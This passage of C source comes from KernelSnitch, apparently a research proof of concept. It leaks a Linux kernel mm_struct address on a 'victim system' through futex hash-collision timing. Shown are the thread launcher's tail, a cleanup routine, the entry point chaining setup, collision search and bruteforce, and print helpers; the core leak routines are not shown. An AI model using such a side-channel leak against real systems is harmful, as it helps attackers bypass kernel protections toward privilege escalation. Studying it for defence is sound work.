    size_t span = (ks->identity_end - ks->identity_start) / ks->thread_cnt;
    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
        mm_leak_arg->range.start = ks->identity_start + span*i;
        mm_leak_arg->range.end = ks->identity_start + span*(i+1);
        if (mm_leak_arg->range.end > ks->identity_end) {
            mm_leak_arg->range.end = ks->identity_end;
        }
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i)
        pthread_join(ks->tids[i], 0);
    if (ks->verbose)
        pr_info("bruteforce dbg_any_match=%zu (candidates where >=2 addrs shared bucket)\n", ks->dbg_any_match);
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->t_before, sizeof(size_t)*ks->total_futexes);
    ks->t_before = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->candidate_addrs, sizeof(size_t)*ks->candidate_max);
    ks->candidate_addrs = 0;
    munmap((void *)ks->times2, sizeof(size_t)*ks->total_futexes);
    ks->times2 = 0;
    munmap((void *)ks->t_before2, sizeof(size_t)*ks->total_futexes);
    ks->t_before2 = 0;
    munmap((void *)ks->times3, sizeof(size_t)*ks->total_futexes);
    ks->times3 = 0;
    munmap((void *)ks->candidate1_idx, sizeof(size_t)*ks->candidate_max);
    ks->candidate1_idx = 0;
    munmap((void *)ks->candidate2_idx, sizeof(size_t)*ks->candidate_max);
    ks->candidate2_idx = 0;
    munmap((void *)ks->candidate3_idx, sizeof(size_t)*ks->candidate_max);
    ks->candidate3_idx = 0;
    munmap((void *)ks->stable_candidate_idx, sizeof(size_t)*ks->candidate_max);
    ks->stable_candidate_idx = 0;
    munmap((void *)ks->accepted_idx, sizeof(size_t)*(ks->collisions + 1));
    ks->accepted_idx = 0;
    munmap((void *)ks->candidate_t2c_votes, sizeof(size_t)*ks->candidate_max);
    ks->candidate_t2c_votes = 0;
    munmap((void *)ks->candidate_c2t_votes, sizeof(size_t)*ks->candidate_max);
    ks->candidate_c2t_votes = 0;
    ks->candidate_c2c_votes = 0;
    munmap((void *)ks->candidate_t2c_before, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS);
    ks->candidate_t2c_before = 0;
    munmap((void *)ks->candidate_t2c_after, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS);
    ks->candidate_t2c_after = 0;
    munmap((void *)ks->candidate_c2t_before, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS);
    ks->candidate_c2t_before = 0;
    munmap((void *)ks->candidate_c2t_after, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS);
    ks->candidate_c2t_after = 0;
    munmap((void *)ks->candidate_c2c_before, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS);
    ks->candidate_c2c_before = 0;
    munmap((void *)ks->candidate_c2c_after, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS);
    ks->candidate_c2c_after = 0;
    munmap((void *)ks->candidate_initial_before, sizeof(size_t)*ks->candidate_max);
    ks->candidate_initial_before = 0;
    munmap((void *)ks->candidate_initial_after, sizeof(size_t)*ks->candidate_max);
    ks->candidate_initial_after = 0;
    munmap((void *)ks->v9_disc_idx, sizeof(size_t)*KS_V9_DISC_MAX);
    ks->v9_disc_idx = 0;
    munmap((void *)ks->v9_disc_t2c_votes, sizeof(size_t)*KS_V9_DISC_MAX);
    ks->v9_disc_t2c_votes = 0;
    munmap((void *)ks->v9_disc_c2t_votes, sizeof(size_t)*KS_V9_DISC_MAX);
    ks->v9_disc_c2t_votes = 0;
    munmap((void *)ks->v9_disc_t2c_before, sizeof(size_t)*KS_V9_DISC_MAX*KS_RUN16_VOTING_ROUNDS);
    ks->v9_disc_t2c_before = 0;
    munmap((void *)ks->v9_disc_t2c_after, sizeof(size_t)*KS_V9_DISC_MAX*KS_RUN16_VOTING_ROUNDS);
    ks->v9_disc_t2c_after = 0;
    munmap((void *)ks->v9_disc_c2t_before, sizeof(size_t)*KS_V9_DISC_MAX*KS_RUN16_VOTING_ROUNDS);
    ks->v9_disc_c2t_before = 0;
    munmap((void *)ks->v9_disc_c2t_after, sizeof(size_t)*KS_V9_DISC_MAX*KS_RUN16_VOTING_ROUNDS);
    ks->v9_disc_c2t_after = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}

/**
 * Performs KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_find_collisions(ks);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_bruteforce(ks);
    if (ks->verbose) pr_info("===============================================\n");
    return kernelsnitch_cleanup(ks);
}

/**
 * Prints the current execution state KernelSnitch is in
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
{
    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
}

/**
 * Prints the found collisions
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
{
    pr_info("collisions:\n");
    for (size_t i = 0; i < ks->accepted_count; ++i) {
        size_t addr = ks->futex_addrs[i];
        pr_info("  %016zx\n", addr);
    }
}

/**
 * KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @return: the found mm_struct address
 */
size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
{
    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2,
                              KS_RUN16_COLLISIONS, 0, 0);
}
